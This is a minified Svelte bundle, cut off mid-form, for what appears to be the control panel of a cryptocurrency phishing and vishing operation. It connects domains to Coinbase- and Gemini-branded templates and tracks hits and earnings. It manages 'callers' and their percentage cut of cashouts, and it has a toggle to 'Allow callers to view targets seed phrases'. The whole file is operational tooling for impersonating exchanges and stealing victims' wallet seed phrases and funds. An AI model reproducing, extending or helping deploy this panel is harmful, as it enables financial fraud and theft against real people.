import"../chunks/Bzak7iHL.js";import{o as st,s as h,e as c,d as Dt}from"../chunks/Ck01Vq7Y.js";import{A as at,B as l,g as e,aT as g,aW as Xe,aX as ut,f as S,z as Ee,G as s,F as a,I as t,a as m,D as lt,C as ee,n as Fe,d as p,h as rt,aY as dt,aZ as Pe,aV as Ve,y as et,L as Tt,a_ as wt,H as vt}from"../chunks/CL1ai2Yl.js";import{i as E}from"../chunks/Cfw8beTg.js";import{r as Se,b as Oe,s as tt,c as Lt,a as yt}from"../chunks/bg2FVGoa.js";import{t as I,s as He,e as Ke,f as ze,a as Ye,b as We,C as mt,G as bt,c as De,i as Qe,d as Ze,g as ht,p as At,j as Ot}from"../chunks/DbIzEwoh.js";import"../chunks/DB_lmZqj.js";import{i as ot}from"../chunks/DQkptMSE.js";import{p as ct}from"../chunks/RR5R80WA.js";import{g as gt}from"../chunks/B0yxJNGR.js";var zt=S('<div class="error-message svelte-1o6c14w"><span class="material-icons">error_outline</span> <p> </p> <button class="close-error svelte-1o6c14w"><span class="material-icons">close</span></button></div>'),Pt=S('<div class="loading svelte-1o6c14w"><div class="loader svelte-1o6c14w"></div> <span>Loading dashboard data...</span></div>'),Ut=S('<tr><td class="svelte-1o6c14w"> </td><td class="url-cell svelte-1o6c14w"> </td><td class="svelte-1o6c14w"><div class="logoHolder svelte-1o6c14w"><img height="15" width="15"/> <span> </span></div></td><td class="svelte-1o6c14w"><div><span class="material-icons"> </span> <span> </span></div></td><td class="svelte-1o6c14w"> </td><td class="svelte-1o6c14w"> </td><td class="svelte-1o6c14w"><button class="disconnect-btn svelte-1o6c14w"><span class="material-icons">link_off</span> Disconnect</button></td></tr>'),Nt=S(`<div class="performance"><div class="stats-grid svelte-1o6c14w"><div class="stat-box svelte-1o6c14w"><p class="svelte-1o6c14w">Panel Status</p> <h2 class="svelte-1o6c14w"> </h2></div> <div class="stat-box svelte-1o6c14w"><p class="svelte-1o6c14w">Net Earnings</p> <h2 class="svelte-1o6c14w"> </h2></div> <div class="stat-box svelte-1o6c14w"><p class="svelte-1o6c14w">Gross Earnings</p> <h2 class="svelte-1o6c14w"> </h2></div> <div class="stat-box svelte-1o6c14w"><p class="svelte-1o6c14w">Total Hits</p> <h2 class="svelte-1o6c14w"> </h2></div></div> <div class="instructions svelte-1o6c14w"><h2 class="svelte-1o6c14w">How to Connect a Domain</h2> <p>To connect a domain to your application, you need to configure your domain's DNS settings. Follow these steps:</p> <ol class="svelte-1o6c14w"><li class="svelte-1o6c14w">Log in to your domain registrar's website (e.g., GoDaddy, Namecheap).</li> <li class="svelte-1o6c14w">Navigate to the DNS management section for your domain.</li> <li class="svelte-1o6c14w">Create a new <strong class="svelte-1o6c14w">A record</strong>.</li> <li class="svelte-1o6c14w">Set the <strong class="svelte-1o6c14w">Host</strong> to <strong class="svelte-1o6c14w">@</strong> (or your desired subdomain).</li> <li class="svelte-1o6c14w">Set the <strong class="svelte-1o6c14w">Value</strong> to <strong class="svelte-1o6c14w"> </strong> where this application is hosted.</li></ol> <p>It may take some time for the DNS changes to propagate. Once the changes have propagated, your domain will be connected to the application.</p></div> <div class="table-section svelte-1o6c14w"><div class="table-header svelte-1o6c14w"><button class="add-btn svelte-1o6c14w"><span class="material-icons">add</span> Add Domain</button></div> <table class="svelte-1o6c14w"><thead><tr><th class="svelte-1o6c14w">ID</th><th class="svelte-1o6c14w">URL</th><th class="svelte-1o6c14w">Template</th><th class="svelte-1o6c14w">Status</th><th class="svelte-1o6c14w">Earnings</th><th class="svelte-1o6c14w">Hits</th><th class="svelte-1o6c14w">Actions</th></tr></thead><tbody></tbody></table></div></div>`),Et=S('<div role="button" tabindex="0"><div class="logoHolder svelte-1o6c14w"><img height="20" width="20"/> <span> </span></div></div>'),Ft=S('<div class="modal-overlay svelte-1o6c14w" role="button" tabindex="0"><div class="modal svelte-1o6c14w" role="button" tabindex="0"><h2 class="svelte-1o6c14w">Add Domain <button class="closeBtn svelte-1o6c14w"><span class="material-icons">close</span></button></h2> <div class="modal-content svelte-1o6c14w"><div class="input-group svelte-1o6c14w"><label for="template" class="svelte-1o6c14w">Template</label> <div class="template-select svelte-1o6c14w"></div></div> <div class="input-group svelte-1o6c14w"><label for="domain-name" class="svelte-1o6c14w">Domain Name</label> <input type="text" id="domain-name" placeholder="Enter domain name..." class="svelte-1o6c14w"/></div> <button class="submit-btn svelte-1o6c14w">Add Domain</button></div></div></div>'),Rt=S('<div class="modal-overlay svelte-1o6c14w" role="button" tabindex="0"><div class="modal delete-modal svelte-1o6c14w" role="button" tabindex="0"><h2 class="svelte-1o6c14w">Disconnect Domain <button class="closeBtn svelte-1o6c14w"><span class="material-icons">close</span></button></h2> <div class="modal-content svelte-1o6c14w"><div class="delete-warning svelte-1o6c14w"><span class="material-icons warning-icon svelte-1o6c14w">warning</span> <p>Are you sure you want to disconnect this domain?</p> <div class="domain-url svelte-1o6c14w"> </div> <p class="warning-text svelte-1o6c14w">This action cannot be undone.</p></div> <div class="modal-actions svelte-1o6c14w"><button class="cancel-btn svelte-1o6c14w">Cancel</button> <button class="disconnect-btn svelte-1o6c14w"><span class="material-icons">link_off</span> Disconnect Domain</button></div></div></div></div>'),It=S('<div class="overview svelte-1o6c14w"><div class="intro svelte-1o6c14w"><div class="header-content svelte-1o6c14w"><div class="title-section svelte-1o6c14w"><h1 class="svelte-1o6c14w">Overview</h1> <p class="svelte-1o6c14w">An overview of your performance</p></div> <div class="search-box svelte-1o6c14w"><span class="material-icons search-icon svelte-1o6c14w">search</span> <input type="text" placeholder="Search domains..." class="svelte-1o6c14w"/></div></div></div> <!> <!></div> <!> <!>',1);function $t(xe,U){at(U,!1);const G=g();let H=ct(U,"guild",8),F=g([]),Z=g(0),B=g(0),z=g(0),K=g(!0),W=g(!1),V=g(!1),v=g("Coinbase"),f=g(""),ae=g(""),w=g(null),_e=g(null);const Re=[{name:"Coinbase",logo:mt},{name:"Gemini",logo:bt}];async function P(n){try{const o=new AbortController,i=setTimeout(()=>o.abort(),5e3),r=await fetch(`https://${n}`,{signal:o.signal});return clearTimeout(i),r.status===200}catch{return!1}}function $(n){l(_e,n),l(V,!0)}async function oe(){if(e(_e))try{(await fetch("/api/guild/removeDomain",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({guild:H(),url:e(_e).URL})})).ok?(await me(),l(V,!1),l(_e,null)):l(w,"Failed to disconnect domain")}catch(n){l(w,"Error disconnecting domain"),console.error(n)}}async function ie(){try{(await fetch("/api/guild/addDomain",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({guild:H(),url:e(f),template:e(v)})})).ok?(l(W,!1),l(f,""),await me()):l(w,"Failed to add domain")}catch(n){l(w,"Error adding domain"),console.error(n)}}let ce=[];async function me(){try{const o=await(await fetch(`/api/guild/getDomains?guild=${H()}`)).json(),r=await(await fetch(`/api/guild/getCashouts?guild=${H()}`)).json();r.success&&(ce=r.cashouts,l(Z,ce.reduce((d,b)=>d+Number(b.amount),0)),l(B,ce.reduce((d,b)=>{const x=Number(b.amount)*(Number(b.percentage_cut)/100);return d+(Number(b.amount)-x)},0)),l(z,ce.length)),l(F,await Promise.all(o.map(async(d,b)=>{const x=await P(d.url);return{ID:b+1,URL:d.url,Template:d.template||"Coinbase",starterPage:"account_review",Status:x?"Operational":"Offline",earnings:e(Z),hits:e(z)}}))),l(K,!1)}catch(n){l(w,"Error fetching data"),console.error(n),l(K,!1)}}let ve;st(()=>(me(),ve=setInterval(async()=>{l(F,await Promise.all(e(F).map(async n=>{const o=await P(n.URL);return{...n,Status:o?"Operational":"Offline"}}))),l(F,[...e(F)])},3e4),()=>{ve&&clearInterval(ve)})),Xe(()=>(e(F),e(ae)),()=>{l(G,e(F).filter(n=>n.URL.toLowerCase().includes(e(ae).toLowerCase())||n.Template.toLowerCase().includes(e(ae).toLowerCase())))}),ut(),ot();var ge=It(),we=Ee(ge),Te=s(we),ye=s(Te),A=a(s(ye),2),Q=a(s(A),2);Se(Q),t(A),t(ye),t(Te);var re=a(Te,2);{var Le=n=>{var o=zt(),i=a(s(o),2),r=s(i,!0);t(i);var d=a(i,2);t(o),ee(()=>h(r,e(w))),c("click",d,()=>l(w,null)),I(3,o,()=>He),m(n,o)};E(re,n=>{e(w)&&n(Le)})}var je=a(re,2);{var Ie=n=>{var o=Pt();m(n,o)},Me=n=>{var o=Nt(),i=s(o),r=s(i),d=a(s(r),2),b=s(d,!0);t(d),t(r);var x=a(r,2),_=a(s(x),2),y=s(_);t(_),t(x);var D=a(x,2),M=a(s(D),2),O=s(M);t(M),t(D);var j=a(D,2),k=a(s(j),2),J=s(k,!0);t(k),t(j),t(i);var T=a(i,2),te=a(s(T),4),R=a(s(te),8),le=a(s(R),3),q=s(le,!0);t(le),Fe(),t(R),t(te),Fe(2),t(T);var Y=a(T,2),N=s(Y),ke=s(N);t(N);var de=a(N,2),be=a(s(de));Ke(be,5,()=>e(G),Qe,(ne,C)=>{var fe=Ut(),ue=s(fe),qe=s(ue,!0);t(ue);var Ae=a(ue),pe=s(Ae,!0);t(Ae);var se=a(Ae),Ce=s(se),Ne=s(Ce),Be=a(Ne,2),Ge=s(Be,!0);t(Be),t(Ce),t(se);var he=a(se),$e=s(he),Je=s($e),nt=s(Je,!0);t(Je);var it=a(Je,2),jt=s(it,!0);t(it),t($e),t(he);var pt=a(he),kt=s(pt);t(pt);var _t=a(pt),xt=s(_t,!0);t(_t);var ft=a(_t),qt=s(ft);t(ft),t(fe),ee((Ct,St)=>{h(qe,(e(C),p(()=>e(C).ID))),h(pe,(e(C),p(()=>e(C).URL))),tt(Ne,"src",(e(C),rt(mt),rt(bt),p(()=>e(C).Template==="Coinbase"?mt:bt))),tt(Ne,"alt",(e(C),p(()=>e(C).Template))),h(Ge,(e(C),p(()=>e(C).Template))),De($e,1,`status-badge ${Ct??""}`,"svelte-1o6c14w"),h(nt,(e(C),p(()=>e(C).Status==="Operational"?"check_circle":"error"))),h(jt,(e(C),p(()=>e(C).Status))),h(kt,`$${St??""}`),h(xt,(e(C),p(()=>e(C).hits)))},[()=>(e(C),p(()=>e(C).Status.toLowerCase())),()=>(e(C),p(()=>e(C).earnings.toLocaleString()))]),c("click",qt,()=>$(e(C))),I(3,fe,()=>He),m(ne,fe)}),t(be),t(de),t(Y),t(o),ee((ne,C,fe)=>{h(b,ne),h(y,`$${C??""}`),h(O,`$${fe??""}`),h(J,e(z)),h(q,p(()=>"45.153.34.107"))},[()=>(e(F),p(()=>e(F).some(ne=>ne.Status==="Operational")?"Operational":"Offline")),()=>(e(B),p(()=>e(B).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2}))),()=>(e(Z),p(()=>e(Z).toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2})))]),c("click",ke,()=>l(W,!0)),I(3,o,()=>ze),m(n,o)};E(je,n=>{e(K)?n(Ie):n(Me,!1)})}t(we);var Ue=a(we,2);{var X=n=>{var o=Ft(),i=s(o),r=s(i),d=a(s(r));t(r);var b=a(r,2),x=s(b),_=a(s(x),2);Ke(_,5,()=>Re,Qe,(O,j)=>{var k=Et(),J=s(k),T=s(J),te=a(T,2),R=s(te,!0);t(te),t(J),t(k),ee(()=>{De(k,1,`template-option ${e(v),e(j),p(()=>e(v)===e(j).name?"selected":"")??""}`,"svelte-1o6c14w"),tt(T,"src",(e(j),p(()=>e(j).logo))),tt(T,"alt",(e(j),p(()=>e(j).name))),h(R,(e(j),p(()=>e(j).name)))}),c("click",k,()=>l(v,e(j).name)),c("keydown",k,()=>{}),m(O,k)}),t(_),t(x);var y=a(x,2),D=a(s(y),2);Se(D),t(y);var M=a(y,2);t(b),t(i),t(o),c("click",d,()=>l(W,!1)),Oe(D,()=>e(f),O=>l(f,O)),c("click",M,ie),I(3,i,()=>Ye),c("click",i,We(function(O){Ze.call(this,U,O)})),c("keydown",i,()=>{}),I(3,o,()=>ze),c("click",o,()=>l(W,!1)),c("keydown",o,()=>{}),m(n,o)};E(Ue,n=>{e(W)&&n(X)})}var L=a(Ue,2);{var u=n=>{var o=Rt(),i=s(o),r=s(i),d=a(s(r));t(r);var b=a(r,2),x=s(b),_=a(s(x),4),y=s(_,!0);t(_),Fe(2),t(x);var D=a(x,2),M=s(D),O=a(M,2);t(D),t(b),t(i),t(o),ee(()=>h(y,(e(_e),p(()=>{var j;return(j=e(_e))==null?void 0:j.URL})))),c("click",d,()=>l(V,!1)),c("click",M,()=>l(V,!1)),c("click",O,oe),I(3,i,()=>Ye),c("click",i,We(function(j){Ze.call(this,U,j)})),c("keydown",i,()=>{}),I(3,o,()=>ze),c("click",o,()=>l(V,!1)),c("keydown",o,()=>{}),m(n,o)};E(L,n=>{e(V)&&n(u)})}Oe(Q,()=>e(ae),n=>l(ae,n)),m(xe,ge),lt()}var Mt=S('<div class="error-message svelte-1cb8cwt"><span class="material-icons">error_outline</span> <p> </p> <button class="close-error svelte-1cb8cwt"><span class="material-icons">close</span></button></div>'),Jt=S('<div class="loading svelte-1cb8cwt"><div class="loader svelte-1cb8cwt"></div> <span>Loading users...</span></div>'),Gt=S('<tr class="svelte-1cb8cwt"><td class="svelte-1cb8cwt"> </td><td class="svelte-1cb8cwt"> </td><td class="svelte-1cb8cwt"><span><span class="material-icons svelte-1cb8cwt"> </span> </span></td><td class="svelte-1cb8cwt"> </td><td class="svelte-1cb8cwt"><div class="action-buttons svelte-1cb8cwt"><button class="icon-button edit svelte-1cb8cwt"><span class="material-icons">edit</span> Edit</button> <button class="icon-button delete svelte-1cb8cwt"><span class="material-icons">delete</span> Remove</button></div></td></tr>'),Ht=S('<div class="users-list"><table class="svelte-1cb8cwt"><thead><tr><th class="svelte-1cb8cwt">Username</th><th class="svelte-1cb8cwt">User ID</th><th class="svelte-1cb8cwt">Rank</th><th class="svelte-1cb8cwt">Starting Page</th><th class="svelte-1cb8cwt">Actions</th></tr></thead><tbody></tbody></table></div>'),Bt=S('<div class="modal-backdrop svelte-1cb8cwt" role="button" tabindex="0"><div class="modal svelte-1cb8cwt" role="button" tabindex="0"><div class="modal-header svelte-1cb8cwt"><h2 class="svelte-1cb8cwt"><span class="material-icons">person_add</span> Add New User</h2> <button class="close-modal svelte-1cb8cwt"><span class="material-icons">close</span></button></div> <form class="svelte-1cb8cwt"><div class="form-group svelte-1cb8cwt"><label for="username" class="svelte-1cb8cwt">Username</label> <input type="text" id="username" required class="svelte-1cb8cwt"/></div> <div class="form-group svelte-1cb8cwt"><label for="userid" class="svelte-1cb8cwt">User ID</label> <input type="text" id="userid" required class="svelte-1cb8cwt"/></div> <div class="form-group svelte-1cb8cwt"><label for="password" class="svelte-1cb8cwt">Password</label> <input type="password" id="password" required placeholder="Enter password" class="svelte-1cb8cwt"/></div> <div class="form-group svelte-1cb8cwt"><label for="rank" class="svelte-1cb8cwt">Rank</label> <select id="rank" class="svelte-1cb8cwt"><option>Admin</option><option>Member</option></select></div> <div class="form-group svelte-1cb8cwt"><label for="starting_page" class="svelte-1cb8cwt">Starting Page</label> <input type="text" id="starting_page" required class="svelte-1cb8cwt"/></div> <div class="modal-actions svelte-1cb8cwt"><button type="button" class="secondary svelte-1cb8cwt">Cancel</button> <button type="submit" class="primary svelte-1cb8cwt"><span class="material-icons">add_circle</span> Add User</button></div></form></div></div>'),Vt=S('<div class="modal-backdrop svelte-1cb8cwt" role="button" tabindex="0"><div class="modal svelte-1cb8cwt" role="button" tabindex="0"><div class="modal-header svelte-1cb8cwt"><h2 class="svelte-1cb8cwt"><span class="material-icons">edit</span> Edit User</h2> <button class="close-modal svelte-1cb8cwt"><span class="material-icons">close</span></button></div> <form class="svelte-1cb8cwt"><div class="form-group svelte-1cb8cwt"><label for="edit-username" class="svelte-1cb8cwt">Username</label> <input type="text" id="edit-username" required class="svelte-1cb8cwt"/></div> <div class="form-group svelte-1cb8cwt"><label for="edit-userid" class="svelte-1cb8cwt">User ID</label> <input type="text" id="edit-userid" required class="svelte-1cb8cwt"/></div> <div class="form-group svelte-1cb8cwt"><label for="edit-password" class="svelte-1cb8cwt">Password</label> <input type="password" id="edit-password" placeholder="Leave empty to keep current password" class="svelte-1cb8cwt"/></div> <div class="form-group svelte-1cb8cwt"><label for="edit-rank" class="svelte-1cb8cwt">Rank</label> <select id="edit-rank" class="svelte-1cb8cwt"><option>Admin</option><option>Member</option></select></div> <div class="form-group svelte-1cb8cwt"><label for="edit-starting_page" class="svelte-1cb8cwt">Starting Page</label> <input type="text" id="edit-starting_page" required class="svelte-1cb8cwt"/></div> <div class="modal-actions svelte-1cb8cwt"><button type="button" class="secondary svelte-1cb8cwt">Cancel</button> <button type="submit" class="primary svelte-1cb8cwt"><span class="material-icons">save</span> Save Changes</button></div></form></div></div>'),Xt=S('<div class="modal-backdrop svelte-1cb8cwt" role="button" tabindex="0"><div class="modal delete-modal svelte-1cb8cwt" role="button" tabindex="0"><div class="modal-header delete svelte-1cb8cwt"><h2 class="svelte-1cb8cwt"><span class="material-icons">warning</span> Confirm Deletion</h2></div> <div class="delete-content svelte-1cb8cwt"><p class="svelte-1cb8cwt">Are you sure you want to remove user <strong> </strong>?</p> <p class="warning svelte-1cb8cwt">This action cannot be undone.</p></div> <div class="modal-actions svelte-1cb8cwt"><button class="secondary svelte-1cb8cwt">Cancel</button> <button class="danger svelte-1cb8cwt"><span class="material-icons">delete_forever</span> Delete User</button></div></div></div>'),Yt=S('<div class="callers-container svelte-1cb8cwt"><div class="intro"><div class="header-content svelte-1cb8cwt"><div class="title-section svelte-1cb8cwt"><h1 class="svelte-1cb8cwt">Users</h1> <p class="svelte-1cb8cwt">Manage your active users</p></div> <div class="search-box svelte-1cb8cwt"><span class="material-icons search-icon svelte-1cb8cwt">search</span> <input type="text" placeholder="Search users..." class="svelte-1cb8cwt"/></div></div></div> <!> <div class="actions svelte-1cb8cwt"><button class="add-button svelte-1cb8cwt"><span class="material-icons">person_add</span> Add User</button></div> <!></div> <!> <!> <!>',1);function Wt(xe,U){at(U,!1);const G=g();let H=ct(U,"guild",8),F=g([]),Z=g(!0),B=g(null),z=g(!1),K=g(!1),W=g(!1),V=g(""),v=g(null),f=g({username:"",userid:"",password:"",rank:"member",starting_page:"account_review"});async function ae(){try{const n=await(await fetch("/api/guild/getGuildCallers",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({guild:H()})})).json();n.success?l(F,n.users):l(B,n.error)}catch(u){l(B,"Failed to fetch users"),console.error(u)}finally{l(Z,!1)}}function w(u){l(v,u),l(W,!0)}function _e(u){l(v,{...u}),l(K,!0)}async function Re(){if(e(v))try{const n=await(await fetch("/api/guild/removeCaller",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({guild:H(),username:e(v).username})})).json();n.success?(l(F,e(F).filter(o=>{var i;return o.username!==((i=e(v))==null?void 0:i.username)})),l(W,!1),l(v,null)):l(B,n.error)}catch(u){l(B,"Failed to remove user"),console.error(u)}}async function P(u){u.preventDefault();try{const o=await(await fetch("/api/guild/addCaller",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...e(f),guild:H()})})).json();o.success?(l(F,[...e(F),o.user]),l(z,!1),l(f,{username:"",userid:"",password:"",rank:"member",starting_page:"account_review"})):l(B,o.error)}catch(n){l(B,"Failed to add user"),console.error(n)}}async function $(u){if(u.preventDefault(),!!e(v))try{const o=await(await fetch("/api/guild/updateCaller",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...e(v),guild:H()})})).json();o.success?(l(F,e(F).map(i=>{var r;return i.username===((r=e(v))==null?void 0:r.username)?o.user:i})),l(K,!1),l(v,null)):l(B,o.error)}catch(n){l(B,"Failed to update user"),console.error(n)}}st(ae),Xe(()=>(e(F),e(V)),()=>{l(G,e(F).filter(u=>u.username.toLowerCase().includes(e(V).toLowerCase())||u.userid.toLowerCase().includes(e(V).toLowerCase())))}),ut(),ot();var oe=Yt(),ie=Ee(oe),ce=s(ie),me=s(ce),ve=a(s(me),2),ge=a(s(ve),2);Se(ge),t(ve),t(me),t(ce);var we=a(ce,2);{var Te=u=>{var n=Mt(),o=a(s(n),2),i=s(o,!0);t(o);var r=a(o,2);t(n),ee(()=>h(i,e(B))),c("click",r,()=>l(B,null)),I(3,n,()=>He),m(u,n)};E(we,u=>{e(B)&&u(Te)})}var ye=a(we,2),A=s(ye);t(ye);var Q=a(ye,2);{var re=u=>{var n=Jt();m(u,n)},Le=u=>{var n=Ht(),o=s(n),i=a(s(o));Ke(i,5,()=>e(G),Qe,(r,d)=>{var b=Gt(),x=s(b),_=s(x,!0);t(x);var y=a(x),D=s(y,!0);t(y);var M=a(y),O=s(M),j=s(O),k=s(j,!0);t(j);var J=a(j);t(O),t(M);var T=a(M),te=s(T,!0);t(T);var R=a(T),le=s(R),q=s(le),Y=a(q,2);t(le),t(R),t(b),ee(()=>{h(_,(e(d),p(()=>e(d).username))),h(D,(e(d),p(()=>e(d).userid))),De(O,1,`rank-badge ${e(d),p(()=>e(d).rank)??""}`,"svelte-1cb8cwt"),h(k,(e(d),p(()=>e(d).rank==="admin"?"admin_panel_settings":"person"))),h(J,` ${e(d),p(()=>e(d).rank)??""}`),h(te,(e(d),p(()=>e(d).starting_page)))}),c("click",q,()=>_e(e(d))),c("click",Y,()=>w(e(d))),I(3,b,()=>He),m(r,b)}),t(i),t(o),t(n),I(3,n,()=>ze),m(u,n)};E(Q,u=>{e(Z)?u(re):u(Le,!1)})}t(ie);var je=a(ie,2);{var Ie=u=>{var n=Bt(),o=s(n),i=s(o),r=a(s(i),2);t(i);var d=a(i,2),b=s(d),x=a(s(b),2);Se(x),t(b);var _=a(b,2),y=a(s(_),2);Se(y),t(_);var D=a(_,2),M=a(s(D),2);Se(M),t(D);var O=a(D,2),j=a(s(O),2);ee(()=>{e(f),dt(()=>{})});var k=s(j);k.value=k.__value="admin";var J=a(k);J.value=J.__value="member",t(j),t(O);var T=a(O,2),te=a(s(T),2);Se(te),t(T);var R=a(T,2),le=s(R);Fe(2),t(R),t(d),t(o),t(n),c("click",r,()=>l(z,!1)),Oe(x,()=>e(f).username,q=>Pe(f,e(f).username=q)),Oe(y,()=>e(f).userid,q=>Pe(f,e(f).userid=q)),Oe(M,()=>e(f).password,q=>Pe(f,e(f).password=q)),ht(j,()=>e(f).rank,q=>Pe(f,e(f).rank=q)),Oe(te,()=>e(f).starting_page,q=>Pe(f,e(f).starting_page=q)),c("click",le,()=>l(z,!1)),c("submit",d,P),I(3,o,()=>Ye),c("click",o,We(function(q){Ze.call(this,U,q)})),c("keydown",o,()=>{}),I(3,n,()=>ze),c("click",n,()=>l(z,!1)),c("keydown",n,()=>{}),m(u,n)};E(je,u=>{e(z)&&u(Ie)})}var Me=a(je,2);{var Ue=u=>{var n=Vt(),o=s(n),i=s(o),r=a(s(i),2);t(i);var d=a(i,2),b=s(d),x=a(s(b),2);Se(x),t(b);var _=a(b,2),y=a(s(_),2);Se(y),t(_);var D=a(_,2),M=a(s(D),2);Se(M),t(D);var O=a(D,2),j=a(s(O),2);ee(()=>{e(v),dt(()=>{})});var k=s(j);k.value=k.__value="admin";var J=a(k);J.value=J.__value="member",t(j),t(O);var T=a(O,2),te=a(s(T),2);Se(te),t(T);var R=a(T,2),le=s(R);Fe(2),t(R),t(d),t(o),t(n),c("click",r,()=>l(K,!1)),Oe(x,()=>e(v).username,q=>Pe(v,e(v).username=q)),Oe(y,()=>e(v).userid,q=>Pe(v,e(v).userid=q)),Oe(M,()=>e(v).password,q=>Pe(v,e(v).password=q)),ht(j,()=>e(v).rank,q=>Pe(v,e(v).rank=q)),Oe(te,()=>e(v).starting_page,q=>Pe(v,e(v).starting_page=q)),c("click",le,()=>l(K,!1)),c("submit",d,$),I(3,o,()=>Ye),c("click",o,We(function(q){Ze.call(this,U,q)})),c("keydown",o,()=>{}),I(3,n,()=>ze),c("click",n,()=>l(K,!1)),c("keydown",n,()=>{}),m(u,n)};E(Me,u=>{e(K)&&e(v)&&u(Ue)})}var X=a(Me,2);{var L=u=>{var n=Xt(),o=s(n),i=a(s(o),2),r=s(i),d=a(s(r)),b=s(d,!0);t(d),Fe(),t(r),Fe(2),t(i);var x=a(i,2),_=s(x),y=a(_,2);t(x),t(o),t(n),ee(()=>h(b,(e(v),p(()=>e(v).username)))),c("click",_,()=>l(W,!1)),c("click",y,Re),I(3,o,()=>Ye),c("click",o,We(function(D){Ze.call(this,U,D)})),c("keydown",o,()=>{}),I(3,n,()=>ze),c("click",n,()=>l(W,!1)),c("keydown",n,()=>{}),m(u,n)};E(X,u=>{e(W)&&e(v)&&u(L)})}Oe(ge,()=>e(V),u=>l(V,u)),c("click",A,()=>l(z,!0)),m(xe,oe),lt()}var Zt=S('<div class="error-message svelte-1r5sixy"><span class="material-icons">error_outline</span> <p> </p> <button class="close-error svelte-1r5sixy"><span class="material-icons">close</span></button></div>'),Kt=S('<div class="success-message svelte-1r5sixy"><span class="material-icons">check_circle</span> <p>Settings saved successfully</p></div>'),Qt=S('<div class="loading svelte-1r5sixy"><div class="loader svelte-1r5sixy"></div> <span>Loading settings...</span></div>'),es=S('<div class="setting-box svelte-1r5sixy"><div class="setting-content svelte-1r5sixy"><div class="setting-info svelte-1r5sixy"><h3 class="svelte-1r5sixy">Display seeds for callers</h3> <p class="svelte-1r5sixy"> </p></div> <label class="toggle svelte-1r5sixy"><input type="checkbox" class="svelte-1r5sixy"/> <span class="slider svelte-1r5sixy"></span></label></div></div>'),ts=S('<div class="settings-grid svelte-1r5sixy"></div>'),ss=S('<div class="settings-container svelte-1r5sixy"><div class="intro"><div class="header-content svelte-1r5sixy"><div class="title-section svelte-1r5sixy"><h1 class="svelte-1r5sixy">Settings</h1> <p class="svelte-1r5sixy">Manage your panel settings</p></div></div></div> <!> <!> <!></div>');function as(xe,U){at(U,!1);let G=ct(U,"guild",8),H=g([]),F=g(!0),Z=g(null),B=g(!1);async function z(){try{const $=await(await fetch(`/api/guild/getSettings?guild=${G()}`)).json();l(H,[{name:"displaySeeds",value:$.displaySeeds||!1,description:"Allow callers to view targets seed phrases"}]),l(F,!1)}catch(P){l(Z,"Failed to load settings"),console.error(P),l(F,!1)}}async function K(P){try{(await fetch("/api/guild/updateSettings",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({guild:G(),setting:P.name,value:P.value})})).ok?(l(B,!0),setTimeout(()=>l(B,!1),3e3)):l(Z,"Failed to update setting")}catch($){l(Z,"Error updating setting"),console.error($)}}st(z),ot();var W=ss(),V=a(s(W),2);{var v=P=>{var $=Zt(),oe=a(s($),2),ie=s(oe,!0);t(oe);var ce=a(oe,2);t($),ee(()=>h(ie,e(Z))),c("click",ce,()=>l(Z,null)),I(3,$,()=>He),m(P,$)};E(V,P=>{e(Z)&&P(v)})}var f=a(V,2);{var ae=P=>{var $=Kt();I(3,$,()=>He),m(P,$)};E(f,P=>{e(B)&&P(ae)})}var w=a(f,2);{var _e=P=>{var $=Qt();m(P,$)},Re=P=>{var $=ts();Ke($,5,()=>e(H),Qe,(oe,ie,ce)=>{var me=es(),ve=s(me),ge=s(ve),we=a(s(ge),2),Te=s(we,!0);t(we),t(ge);var ye=a(ge,2),A=s(ye);Se(A),Fe(2),t(ye),t(ve),t(me),ee(()=>h(Te,(e(ie),p(()=>e(ie).description)))),Lt(A,()=>e(ie).value,Q=>(e(ie).value=Q,dt(()=>e(H)))),c("change",A,()=>K(e(ie))),m(oe,me)}),t($),I(3,$,()=>ze),m(P,$)};E(w,P=>{e(F)?P(_e):P(Re,!1)})}t(W),m(xe,W),lt()}var ls=S('<div class="error-message svelte-1j1h1qn"><span class="material-icons">error_outline</span> <p> </p> <button class="close-error svelte-1j1h1qn"><span class="material-icons">close</span></button></div>'),ns=S('<div class="loading svelte-1j1h1qn"><div class="loader svelte-1j1h1qn"></div> <span>Loading cashouts...</span></div>'),is=S('<tr><td class="svelte-1j1h1qn"> </td><td class="svelte-1j1h1qn"> </td><td class="svelte-1j1h1qn"> </td><td class="svelte-1j1h1qn"> </td><td class="svelte-1j1h1qn"><div><span class="material-icons"><!></span> </div></td><td class="svelte-1j1h1qn"><div class="action-buttons svelte-1j1h1qn"><button><span class="material-icons">update</span> Update Status</button> <button class="delete-btn svelte-1j1h1qn"><span class="material-icons">delete</span> Delete</button></div></td></tr>'),rs=S('<div class="table-container"><table class="svelte-1j1h1qn"><thead><tr><th class="svelte-1j1h1qn">ID</th><th class="svelte-1j1h1qn">Caller</th><th class="svelte-1j1h1qn">Amount</th><th class="svelte-1j1h1qn">Date</th><th class="svelte-1j1h1qn">Status</th><th class="svelte-1j1h1qn">Actions</th></tr></thead><tbody></tbody></table></div>'),os=S("<option> </option>"),cs=S(`<div class="modal-backdrop svelte-1j1h1qn" role="button" tabindex="0"><div class="modal svelte-1j1h1qn" role="button" tabindex="0"><div class="modal-header svelte-1j1h1qn"><h2 class="svelte-1j1h1qn"><span class="material-icons">payments</span> Register Cashout</h2> <button class="close-modal svelte-1j1h1qn"><span class="material-icons">close</span></button></div> <form class="svelte-1j1h1qn"><div class="form-group svelte-1j1h1qn"><label for="caller" class="svelte-1j1h1qn">Caller</label> <select id="caller" required class="svelte-1j1h1qn"><option>Select a caller</option><!></select></div> <div class="form-group svelte-1j1h1qn"><label for="totalAmount" class="svelte-1j1h1qn">Total Amount ($)</label> <div class="amount-input svelte-1j1h1qn"><span class="currency-symbol svelte-1j1h1qn">$</span> <input type="number" id="totalAmount" min="0" step="0.01" required placeholder="Enter total amount" class="svelte-1j1h1qn"/></div></div> <div class="form-group svelte-1j1h1qn"><label for="percentage" class="svelte-1j1h1qn">Caller's Cut (%)</label> <div class="percentage-input svelte-1j1h1qn"><input type="number" id="percentage" min="0" max="100" step="0.01" required 